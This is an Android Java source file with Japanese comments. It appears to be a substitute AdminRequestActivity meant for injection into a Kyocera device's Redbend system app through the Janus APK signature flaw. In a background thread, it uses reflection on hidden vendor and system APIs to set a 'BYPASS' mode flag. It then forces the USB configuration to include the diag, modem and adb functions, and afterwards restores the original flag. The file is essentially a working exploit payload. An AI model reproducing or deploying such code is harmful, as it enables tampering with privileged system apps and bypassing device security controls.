package com.redbend.client;

import android.content.Context;
import android.os.Bundle;
import android.os.Process;
import android.os.UserHandle;
import android.os.UserManager;
import android.support.v4.app.C0005f;
import android.widget.Toast;

import java.lang.reflect.Method;

/**
 * Janus 差し替え用 AdminRequestActivity。
 *
 * - FQN は元クラスと完全一致 (com.redbend.client.AdminRequestActivity)
 * - 基底 SwmStartupActivityBase を維持 (manifest 無改変)
 * - 基底 onCreate() から必ず sendStartServiceEvent() が呼ばれるため、そこへ
 *   USB 切替処理をフックする。レイアウト不要 (Theme.NoDisplay)。
 * - Transfer / SystemProperties / UsbManager#setCurrentFunction は
 *   すべてリフレクション (jp.kyocera.internal.clomask.Transfer への
 *   ハード依存を排除し、クラスロードエラーも回避)。
 * - 各ステップを独立 try/catch(Throwable) で囲い、
 *   どこかで失敗しても必ず最終ステップ (元値復元) まで到達させる。
 */
public class AdminRequestActivity extends SwmStartupActivityBase {

    private static final String TAG = "AdminRequestActivity";

    /* ---- 解析済みコード (LawmoLockHandler) と同じ rw_* 命名規則 ---- */
    private static final String KEY_RW_QFUNC_MODE = "rw_qfunc_mode";
    private static final String VALUE_BYPASS      = "1";

    /* ---- USB combo request ---- */
    private static final String COMBO_REQUEST = "rndis,diag,modem,none,adb";

    private static final int  TRIGGER_COUNT    = 3;
    private static final long SLEEP_BETWEEN_MS = 500;

    /* ---- 反映確認用 ---- */
    private static final String PERSIST_USB_CONFIG = "persist.sys.usb.config";
    private static final String FN_DIAG            = "diag";

    /* ---- Transfer クラス (リフレクション) ---- */
    private static final String TRANSFER_CLASS_NAME = "jp.kyocera.internal.clomask.Transfer";

    /* ---- 候補 setter 名 (旧 SetBackupAccountActivity と同一順序) ---- */
    private static final String[] SETTER_METHOD_CANDIDATES = {
        "set", "put", "write", "setValue", "update"
    };

    /* ====================================================================
     * 基底 SwmStartupActivityBase の抽象メソッド実装
     * ==================================================================== */

    /**
     * 基底 onCreate() から必ず呼ばれる唯一のフック。
     * Activity はこの直後に finish() されるため、別スレッドで USB 切替を
     * 走らせ、UI スレッド終了に巻き込まれないようにする。
     */
    @Override
    protected void sendStartServiceEvent() {
        C0005f.a(TAG, "sendStartServiceEvent -> USB switch dispatch");

        final Context appContext = getApplicationContext();
        if (appContext == null) {
            C0005f.e(TAG, "application context is null, cannot run USB switch");
            return;
        }

        Thread t = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    runUsbSwitchSafely(appContext);
                } catch (Throwable th) {
                    /* 最終防壁: ここまで来てもクラッシュさせない */
                    C0005f.e(TAG, "runUsbSwitchSafely fatal: " + th);
                }
            }
        }, "rb-usb-switch");
        t.setDaemon(true);
        t.start();
    }

    @Override
    protected void userAcceptedPermission() {
        C0005f.a(TAG, "userAcceptedPermission (nop)");
    }

    @Override
    protected void userDeclinedPermission() {
        C0005f.a(TAG, "userDeclinedPermission (nop)");
    }

    /* ====================================================================
     * USB 切替本体 (元の SetBackupAccountActivity と等価な処理フロー)
     *
     * 各ステップを独立 try/catch で囲い、いずれかが失敗しても
     * 残りを継続し、必ず Step5 (元値復元) まで到達させる。
     * ==================================================================== */
    private static void runUsbSwitchSafely(Context ctx) {
        C0005f.a(TAG, "USB switch start");

        if (ctx == null) {
            C0005f.e(TAG, "context null, abort");
            return;
        }

        /* ---------- Step 1: 現在値保存 (失敗しても続行) ---------- */
        String originalMode = null;
        try {
            originalMode = transferGet(KEY_RW_QFUNC_MODE);
            C0005f.d(TAG, "step1 original rw_qfunc_mode = " + originalMode);
        } catch (Throwable th) {
            C0005f.e(TAG, "step1 read original failed: " + th);
        }

        /* ---------- Step 2: BYPASS 設定 (失敗しても続行) ---------- */
        boolean setOk = false;
        try {
            setOk = transferSet(KEY_RW_QFUNC_MODE, VALUE_BYPASS);
            C0005f.d(TAG, "step2 set rw_qfunc_mode=" + VALUE_BYPASS + " ok=" + setOk);
        } catch (Throwable th) {
            C0005f.e(TAG, "step2 set failed: " + th);
        }

        /* ---------- Step 3: 反映確認 (失敗しても続行) ---------- */
        try {
            String after = transferGet(KEY_RW_QFUNC_MODE);
            C0005f.d(TAG, "step3 verify rw_qfunc_mode = " + after);
            if (!VALUE_BYPASS.equals(after)) {
                C0005f.e(TAG, "step3 verify mismatch, continue anyway");
            }
        } catch (Throwable th) {
            C0005f.e(TAG, "step3 verify failed: " + th);
        }

        /* ---------- Step 4: setCurrentFunction を N 回トグル ---------- */
        for (int i = 0; i < TRIGGER_COUNT; i++) {
            C0005f.d(TAG, "step4 trigger #" + (i + 1) + " start");

            /* 4a: makeDefault=false */
            try {
                setCurrentFunctionViaUsbManager(ctx, COMBO_REQUEST, false);
            } catch (Throwable th) {
                C0005f.e(TAG, "step4 setCurrentFunction(false) failed: " + th);
            }
            sleepQuiet(SLEEP_BETWEEN_MS);

            /* 4b: makeDefault=true */
            try {
                setCurrentFunctionViaUsbManager(ctx, COMBO_REQUEST, true);
            } catch (Throwable th) {
                C0005f.e(TAG, "step4 setCurrentFunction(true) failed: " + th);
            }
            sleepQuiet(SLEEP_BETWEEN_MS);

            /* 4c: persist.sys.usb.config を確認 */
            String persist = "";
            try {
                persist = getSystemProperty(PERSIST_USB_CONFIG, "");
                C0005f.d(TAG, "step4 persist.sys.usb.config = " + persist);
            } catch (Throwable th) {
                C0005f.e(TAG, "step4 read persist failed: " + th);
            }

            boolean hasDiag = false;
            try {
                hasDiag = containsFunction(persist, FN_DIAG);
            } catch (Throwable th) {
                C0005f.e(TAG, "step4 containsFunction failed: " + th);
            }
            if (hasDiag) {
                C0005f.d(TAG, "step4 diag detected, break");
                break;
            }
        }

        /* ---------- Step 5: 元の rw_qfunc_mode に戻す (必ず到達) ---------- */
        if (originalMode != null) {
            try {
                boolean restored = transferSet(KEY_RW_QFUNC_MODE, originalMode);
                C0005f.d(TAG, "step5 restored rw_qfunc_mode=" + originalMode + " ok=" + restored);
            } catch (Throwable th) {
                C0005f.e(TAG, "step5 restore failed: " + th);
            }
        } else {
            C0005f.d(TAG, "step5 skipped (original was null)");
        }

        C0005f.a(TAG, "USB switch end");
    }

    /* ====================================================================
     * リフレクションヘルパ
     * ==================================================================== */

    /** jp.kyocera.internal.clomask.Transfer#get(String) を呼ぶ */
    private static String transferGet(String key) {
        try {
            Class<?> clazz = Class.forName(TRANSFER_CLASS_NAME);
            Method m = clazz.getMethod("get", String.class);
            m.setAccessible(true);
            Object result = m.invoke(null, key);
            return (result instanceof String) ? (String) result : null;
        } catch (Throwable th) {
            C0005f.e(TAG, "transferGet(" + key + ") failed: " + th);
            return null;
        }
    }

    /**
     * jp.kyocera.internal.clomask.Transfer の setter を候補順に試す。
     * 最初に NoSuchMethod を抜けた候補で成功すれば true。
     */
    private static boolean transferSet(String key, String value) {
        for (String methodName : SETTER_METHOD_CANDIDATES) {
            try {
                Class<?> clazz = Class.forName(TRANSFER_CLASS_NAME);
                Method m = clazz.getMethod(methodName, String.class, String.class);
                m.setAccessible(true);
                m.invoke(null, key, value);
                C0005f.d(TAG, "transferSet via " + methodName + " ok");
                return true;
            } catch (NoSuchMethodException nsme) {
                /* 次の候補へ */
            } catch (Throwable th) {
                C0005f.e(TAG, "transferSet via " + methodName + " failed: " + th);
                return false;
            }
        }
        C0005f.e(TAG, "transferSet: no candidate method succeeded");
        return false;
    }

    /** UsbManager#setCurrentFunction(String, boolean) をリフレクションで呼ぶ (@hide API) */
    private static void setCurrentFunctionViaUsbManager(Context context,
                                                        String function,
                                                        boolean makeDefault) {
        try {
            if (context == null) {
                return;
            }
            Object service = context.getSystemService("usb");
            if (service == null) {
                C0005f.e(TAG, "UsbManager is null");
                return;
            }
            Method m = service.getClass().getMethod(
                    "setCurrentFunction", String.class, boolean.class);
            m.setAccessible(true);
            m.invoke(service, function, makeDefault);
        } catch (Throwable th) {
            C0005f.e(TAG, "setCurrentFunction(" + function + ", " + makeDefault + ") failed: " + th);
        }
    }

    /** android.os.SystemProperties#get(String, String) をリフレクションで呼ぶ (@hide) */
    private static String getSystemProperty(String key, String defaultValue) {
        try {
            Class<?> spClass = Class.forName("android.os.SystemProperties");
            Method m = spClass.getMethod("get", String.class, String.class);
            m.setAccessible(true);
            Object result = m.invoke(null, key, defaultValue);
            return (result instanceof String) ? (String) result : defaultValue;
        } catch (Throwable th) {
            return defaultValue;
        }
    }

    /** persist.sys.usb.config のカンマ区切りトークン一致 */
    private static boolean containsFunction(String functions, String function) {
        if (functions == null || function == null) {
            return false;
        }
        int index = functions.indexOf(function);
        if (index < 0) {
            return false;
        }
        if (index > 0 && functions.charAt(index - 1) != ',') {
            return false;
        }
        int charAfter = index + function.length();
        return charAfter >= functions.length() || functions.charAt(charAfter) == ',';
    }

    private static void sleepQuiet(long ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        } catch (Throwable th) {
            /* ignore */
        }
    }
}
